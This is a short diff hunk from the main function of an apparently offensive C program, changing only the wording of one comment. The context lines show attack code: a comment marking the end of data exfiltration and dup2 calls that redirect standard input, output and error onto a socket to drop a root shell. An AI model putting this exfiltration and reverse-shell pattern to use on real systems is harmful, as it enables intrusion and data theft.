@@ -137,7 +137,7 @@ int main(void)
 	/* size=0 signals end of exfil */
 	send_frame(CHAIN_FD, NULL, 0);
 
-	/* drop root shell over the chain socket — no new connection needed */
+	/* drop root shell over the chain socket without any new connection*/
 	dup2(CHAIN_FD, 0);
 	dup2(CHAIN_FD, 1);
 	dup2(CHAIN_FD, 2);
